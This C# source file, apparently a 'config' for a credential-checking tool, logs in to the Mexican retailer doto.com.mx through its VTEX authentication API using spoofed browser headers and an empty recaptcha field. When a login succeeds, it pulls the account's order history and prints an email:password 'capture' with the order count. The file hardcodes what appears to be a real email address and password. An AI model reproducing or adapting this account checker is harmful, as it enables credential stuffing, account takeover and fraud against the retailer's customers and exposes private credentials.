using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class DotoMx
    {
        public static void dotomx()
        {
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                string email = "pancho17120101@gmail.com";
                string pass = "Amagno09";

                // Primera solicitud POST
                req.IgnoreProtocolErrors = true;
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36";
                req.AddHeader("Accept", "*/*");
                req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                req.AddHeader("Accept-Language", "es-ES,es;q=0.9");
                req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                req.AddHeader("Origin", "https://www.elektra.com.mx");
                req.AddHeader("Referer", "https://www.elektra.com.mx/login?returnUrl=%2F");
                req.AddHeader("vtex-id-ui-version", "vtex.login@2.40.0/vtex.react-vtexid@4.44.2");
                string postData1 = "accountName=doto&scope=doto&returnUrl=https://www.doto.com.mx/&callbackUrl=https://www.doto.com.mx/api/vtexid/oauth/finish?popup=false&user=" + email +"&fingerprint";
                req.Post("https://www.doto.com.mx/api/vtexid/pub/authentication/startlogin", postData1, "application/x-www-form-urlencoded");

            
             
                req.AddHeader("Host", "www.doto.com.mx");
                req.AddHeader("Connection", "https://www.doto.com.mx/");
                req.AddHeader("Referer", "keep-alive");
                req.AddHeader("sec-ch-ua", "Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"");
                req.AddHeader("vtex-id-ui-version", "vtex.login@2.41.0/vtex.react-vtexid@4.45.0");
                req.AddHeader("sec-ch-ua-mobile", "?0");
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36";
                req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                req.AddHeader("Accept", "*/*");
                req.AddHeader("Origin", "https://www.doto.com.mx/");
                req.AddHeader("Sec-Fetch-Site", "same-origin");
                req.AddHeader("Sec-Fetch-Mode", "cors");
                req.AddHeader("Sec-Fetch-Dest", "empty");
                req.Referer = "https://www.doto.com.mx/";
                req.AddHeader("Accept-Language", "es-419,es;q=0.9");
                req.AddHeader("Accept-Encoding", "gzip, deflate");
                string postData2 = "login=" + email +"&password=" + pass +"&recaptcha=&fingerprint=";
                string send_data = req.Post("https://www.doto.com.mx/api/vtexid/pub/authentication/classic/validate", postData2, "application/x-www-form-urlencoded").ToString();
                //Console.WriteLine(send_data);

                if (send_data.Contains("authStatus\": \"WrongCredentials"))
                {
                    Console.WriteLine("Failure");
                }
                else if (send_data.Contains("authStatus\": \"Success"))
                {
                    req.ClearAllHeaders(); // Limpiamos las cabeceras para la siguiente petición
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36";
                    req.AddHeader("Referer", "https://www.elektra.com.mx/account");
                    req.AddHeader("x-vtex-user-agent", "vtex.my-orders-app@3.13.2");
                    send_data = req.Get("https://www.doto.com.mx/api/oms/user/orders/?page=1",null).ToString();
                    Regex regex = new Regex(@"orderId", RegexOptions.IgnoreCase);
                    int count = regex.Matches(send_data).Count;
                    string capture = " + " + email + ":" + pass + " | Pedidos = " + count;
                    Console.WriteLine(capture);
                  
                }

               
            }

        }
    }
}
